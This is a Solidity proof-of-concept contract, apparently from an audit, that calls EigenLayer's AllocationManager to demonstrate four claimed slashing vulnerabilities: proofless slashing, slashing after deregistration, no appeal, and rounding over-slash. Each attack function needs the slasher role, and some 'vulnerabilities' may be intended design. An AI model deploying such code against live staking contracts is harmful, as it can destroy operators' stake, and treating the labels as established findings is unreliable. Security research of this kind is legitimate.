// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/external/interfaces/IAllocationManager.sol";
import "../src/mocks/eigenlayer/EigenLayerMocks.sol";
import "forge-std/console.sol";

/// @title EigenLayer AllocationManager Vulnerability Attack Contract
/// @notice Demonstrates 4 critical vulnerabilities in EigenLayer AllocationManager
/// @dev This contract contains attack functions that exploit the vulnerabilities
contract EigenLayerSlashingAttack {
    IAllocationManager public allocationManager;

    address public operator;
    address public avsAdmin;
    address public slasher;
    OperatorSet public operatorSet;
    IStrategy[] public strategies;

    constructor(
        address _allocationManager,
        address _operator,
        address _avsAdmin,
        address _slasher,
        OperatorSet memory _operatorSet,
        IStrategy[] memory _strategies
    ) {
        allocationManager = IAllocationManager(_allocationManager);
        operator = _operator;
        avsAdmin = _avsAdmin;
        slasher = _slasher;
        operatorSet = _operatorSet;
        strategies = _strategies;
    }

    /// @notice VULNERABILITY #1: Slash operator without on-chain proof
    /// @param wadToSlash The percentage to slash (0 < wad <= 1e18)
    function slashWithoutProof(uint256 wadToSlash) external {
        require(msg.sender == slasher, "Only slasher can call");
        
        uint256[] memory wadsToSlash = new uint256[](strategies.length);
        for (uint256 i = 0; i < strategies.length; i++) {
            wadsToSlash[i] = wadToSlash;
        }

        SlashingParams memory slashParams = SlashingParams({
            operator: operator,
            operatorSetId: operatorSet.id,
            strategies: strategies,
            wadsToSlash: wadsToSlash,
            description: "Arbitrary slash - NO PROOF PROVIDED"
        });

        // VULNERABILITY: Slasher can slash without providing proof
        allocationManager.slashOperator(avsAdmin, slashParams);
    }

    /// @notice VULNERABILITY #2: Slash operator after deregistration
    function slashAfterDeregistration() external {
        require(msg.sender == slasher, "Only slasher can call");
        
        // First deregister
        uint32[] memory operatorSetIds = new uint32[](1);
        operatorSetIds[0] = operatorSet.id;
        
        DeregisterParams memory deregisterParams = DeregisterParams({
            operator: operator,
            avs: avsAdmin,
            operatorSetIds: operatorSetIds
        });

        allocationManager.deregisterFromOperatorSets(deregisterParams);

        // Then slash (vulnerability: operator still slashable)
        uint256[] memory wadsToSlash = new uint256[](strategies.length);
        for (uint256 i = 0; i < strategies.length; i++) {
            wadsToSlash[i] = 1e18; // 100%
        }

        SlashingParams memory slashParams = SlashingParams({
            operator: operator,
            operatorSetId: operatorSet.id,
            strategies: strategies,
            wadsToSlash: wadsToSlash,
            description: "Slash after deregistration"
        });

        allocationManager.slashOperator(avsAdmin, slashParams);
    }

    /// @notice VULNERABILITY #3: Demonstrate irreversibility (no appeal mechanism)
    function slashAndTryRecover() external {
        require(msg.sender == slasher, "Only slasher can call");
        
        // Slash operator
        uint256[] memory wadsToSlash = new uint256[](strategies.length);
        for (uint256 i = 0; i < strategies.length; i++) {
            wadsToSlash[i] = 1e18 / 2; // 50%
        }

        SlashingParams memory slashParams = SlashingParams({
            operator: operator,
            operatorSetId: operatorSet.id,
            strategies: strategies,
            wadsToSlash: wadsToSlash,
            description: "Incorrect slash - no appeal possible"
        });

        allocationManager.slashOperator(avsAdmin, slashParams);

        // Try to deallocate
        uint64[] memory newMagnitudes = new uint64[](strategies.length);
        for (uint256 i = 0; i < strategies.length; i++) {
            newMagnitudes[i] = 0;
        }

        AllocateParams[] memory allocateParams = new AllocateParams[](1);
        allocateParams[0] = AllocateParams({
            operatorSet: operatorSet,
            strategies: strategies,
            newMagnitudes: newMagnitudes
        });

        allocationManager.modifyAllocations(operator, allocateParams);
    }

    /// @notice VULNERABILITY #4: Demonstrate rounding up over-slashing
    /// @param wadToSlash The percentage to slash (small value to test rounding)
    function slashWithRounding(uint256 wadToSlash) external {
        require(msg.sender == slasher, "Only slasher can call");
        
        uint256[] memory wadsToSlash = new uint256[](strategies.length);
        for (uint256 i = 0; i < strategies.length; i++) {
            wadsToSlash[i] = wadToSlash;
        }

        SlashingParams memory slashParams = SlashingParams({
            operator: operator,
            operatorSetId: operatorSet.id,
            strategies: strategies,
            wadsToSlash: wadsToSlash,
            description: "Small slash to test rounding"
        });

        allocationManager.slashOperator(avsAdmin, slashParams);
    }
}
